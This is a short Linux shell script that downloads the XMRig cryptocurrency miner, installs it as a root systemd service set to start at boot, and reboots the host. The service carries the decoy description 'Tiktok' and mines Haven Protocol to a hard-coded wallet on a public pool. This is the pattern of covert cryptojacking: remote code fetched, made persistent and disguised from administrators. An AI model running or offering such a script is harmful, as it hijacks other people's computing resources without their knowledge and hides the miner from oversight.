cd /home
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz
sudo apt update
sudo tar xvzf xmrig-6.18.1-linux-x64.tar.gz
sudo mv xmrig-6.18.1 xmrig
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/xmrig/xmrig --donate-level 1 -o haven.herominers.com:10451 -u hvs1Uv7rbUKP54rGnT62vu2KHBBGnN5B9Wcxn9gYtyK6GNqbvw7A8qMAa4zYuAarUXFygoznEUvRRgSD8dVHLHTB5Fp5hKubfi -p gh -a cn-heavy/xhv -k\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/haven.service'
sudo systemctl daemon-reload
sudo systemctl enable haven.service
echo "Setup completed!"
sudo reboot
